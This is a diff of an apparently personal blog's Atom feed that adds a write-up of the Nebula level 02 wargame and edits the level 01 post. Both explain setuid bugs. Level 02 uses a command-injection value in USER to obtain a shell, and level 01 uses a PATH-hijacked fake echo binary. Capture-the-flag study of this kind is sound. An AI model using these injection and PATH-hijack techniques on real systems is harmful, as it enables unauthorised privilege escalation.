@@ -4,13 +4,72 @@
  <title>Álvaro</title>
  <link href="http://alvarofe.github.io/atom.xml" rel="self"/>
  <link href="http://alvarofe.github.io/"/>
- <updated>2014-12-11T10:14:32+01:00</updated>
+ <updated>2014-12-11T21:18:57+01:00</updated>
  <id>http://alvarofe.github.io</id>
  <author>
    <name>Álvaro Felipe Melchor</name>
    <email></email>
  </author>
 
+ 
+ <entry>
+   <title>Nebula Level 02</title>
+   <link href="http://alvarofe.github.io/posts/nebulalevel02"/>
+   <updated>2014-12-11T00:00:00+01:00</updated>
+   <id>http://alvarofe.github.io/posts/nebulalevel02</id>
+   <content type="html">&lt;p&gt;Today we have to deal with the challenge nebula 02. We should find out the vulnerability in the following snippet.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-C&quot; data-lang=&quot;C&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;kt&quot;&gt;gid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;uid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;setresgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;setresuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;asprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/bin/echo %s is cool&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;USER&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;about to call system(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The first part of the program remains the same as the challenge in nebula 01. If we look the code carefully we can spot quickly when the problem might arise. If in somehow I can trick the program to execute code when it executes &lt;code&gt;/bin/echo $USER is cool&lt;/code&gt; the work is done.&lt;/p&gt;
+
+&lt;p&gt;We have to try that once the program get the value of variable &lt;code&gt;USER&lt;/code&gt; execute other command. To achieve that we should know a little bit about bash and the solution comes to us quickly.&lt;/p&gt;
+
+&lt;p&gt;In bash there is a way to indicate separation between different statements in one line and is using the special character &lt;code&gt;;&lt;/code&gt;. We can see how the user does not sanitize the value that returns &lt;code&gt;getenv&lt;/code&gt; so it process the meta-characters as normal characters. So to execute an arbitrary program would be enough to do the next.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ USER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;level02 ; echo You was pwned ; sh # &amp;quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./flag02
+about to call system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/bin/echo level02 ; echo You was pwned ; sh #  is cool&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+level02
+You was pwned
+sh-4.2&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;In that way we got a shell. Maybe you are wondering about &lt;code&gt;sh #&lt;/code&gt;. That is why without the &lt;code&gt;#&lt;/code&gt; the string &lt;code&gt;is cool&lt;/code&gt; would be considered as a file so we put &lt;code&gt;#&lt;/code&gt; to comment that line. You can try on your own that without &lt;code&gt;#&lt;/code&gt; you don’t get the shell.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./flag02
+about to call system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/bin/echo level02 ; echo You was pwned ; sh  is cool&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+level02
+You was pwned
+sh: is: No such file or directory
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;If you liked this post, you can
+&lt;a href=&quot;https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/nebulalevel02&amp;text=Nebula Level 02&amp;via=alvaro_fe&quot;&gt;share it with your followers&lt;/a&gt;
+or
+&lt;a href=&quot;https://twitter.com/alvaro_fe&quot;&gt; follow me on Twitter&lt;/a&gt;!&lt;/p&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Nebula Level 01</title>
@@ -39,11 +98,19 @@
   &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;/usr/bin/env echo and now what?&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Basically the &lt;code&gt;setresgid&lt;/code&gt; and &lt;code&gt;setresuid&lt;/code&gt; set the program to run with the owner’s permission. These functions have some kind of nuances depending in the system where they are executed. I encourage to read the following &lt;a href=&quot;https://www.usenix.org/legacy/event/sec02/full_papers/chen/chen.pdf&quot;&gt;paper&lt;/a&gt; to understand it better. Perhaps in other post I will write about them, because thanks to the book &lt;a href=&quot;http://www.amazon.es/The-Software-Security-Assessment-Vulnerabilities/dp/0321444426&quot;&gt;The Art of Software Security Assessment&lt;/a&gt; I have learned a little bit about their nuances. In this case the file has an user &lt;code&gt;flag01&lt;/code&gt; since if in the terminal we execute we observe.&lt;/p&gt;
+&lt;p&gt;Basically the &lt;code&gt;setresgid&lt;/code&gt; and &lt;code&gt;setresuid&lt;/code&gt; set the program to run with the owner’s permission. These functions have some kind of nuances depending in the system where they are executed. If we look the man pages we can read the following.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;When  a  normal program is executed, the effective and real user ID of the process are set to the ID of the user executing the file. When a set ID program is executed the real user ID is set to the calling user and the effective user ID corresponds to the set ID bit on the file being executed.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We check if the file is a set ID program.&lt;/p&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find . -type f -perm +6000 -ls 2&amp;gt; /dev/null
 &lt;span class=&quot;m&quot;&gt;12962&lt;/span&gt;    &lt;span class=&quot;m&quot;&gt;8&lt;/span&gt; -rwsr-x---   &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; flag01   level01      &lt;span class=&quot;m&quot;&gt;7322&lt;/span&gt; Nov &lt;span class=&quot;m&quot;&gt;20&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;2011&lt;/span&gt; ./flag01
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;It is a suid program. It sets the Real, Effective and Saved UIDs the same as the Effective UID. This is so that the SUID process is now effectively running as if called by the owner &lt;code&gt;flag01&lt;/code&gt;. The main issue with this snippet is when it calls &lt;code&gt;echo&lt;/code&gt; without specifying the absolute path or using &lt;code&gt;/usr/bin/env&lt;/code&gt; because otherwise it would have execute the built-in echo. But how it uses&lt;code&gt;/usr/bin/env&lt;/code&gt; it will try to find the echo executable in the variable $PATH. However $PATH is controlled by us, so we could trick the program to use another malicious echo binary. It would be enough to do the next to get a shell.&lt;/p&gt;
+&lt;p&gt;It is a set ID program. Basically the effective user ID will be the set ID on the file being executed that is the ID from flag01. It sets the Real, Effective and Saved UIDs the same as the Effective UID. This is so that the SUID process is now effectively running as if called by the owner &lt;code&gt;flag01&lt;/code&gt;. It seems that the real problem is not here.&lt;/p&gt;
+
+&lt;p&gt;The main issue with this snippet is when it calls &lt;code&gt;echo&lt;/code&gt; without specifying the absolute path or using &lt;code&gt;/usr/bin/env&lt;/code&gt; because otherwise it would have execute the built-in echo. But how it uses&lt;code&gt;/usr/bin/env&lt;/code&gt; it will try to find the echo executable in the variable $PATH. However $PATH is controlled by us, so we could trick the program to use another malicious echo binary. It would be enough to do the next to get a shell.&lt;/p&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt; &amp;gt; /path/echo
 &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;chmod +x /path/echo
 &lt;span class=&quot;nv&quot;&gt;$ PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/path/:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
@@ -53,9 +120,9 @@ sh-4.2&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
 &lt;p&gt;I know that maybe this exercise is easy but as always we have to start from the beginning and never stop to grow. &lt;/p&gt;
 
 &lt;p&gt;If you liked this post, you can
-&lt;a href=&quot;https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/nebulalevel01&amp;text=Nebula Level 01&amp;via=alvaro_fe&quot;&gt;share it with your followers&lt;/a&gt; 
+&lt;a href=&quot;https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/nebulalevel01&amp;text=Nebula Level 01&amp;via=alvaro_fe&quot;&gt;share it with your followers&lt;/a&gt;
 or
-&lt;a href=&quot;https://twitter.com/joshualande&quot;&gt; follow me on Twitter&lt;/a&gt;!&lt;/p&gt;
+&lt;a href=&quot;https://twitter.com/alvaro_fe&quot;&gt; follow me on Twitter&lt;/a&gt;!&lt;/p&gt;
 </content>
  </entry>
  
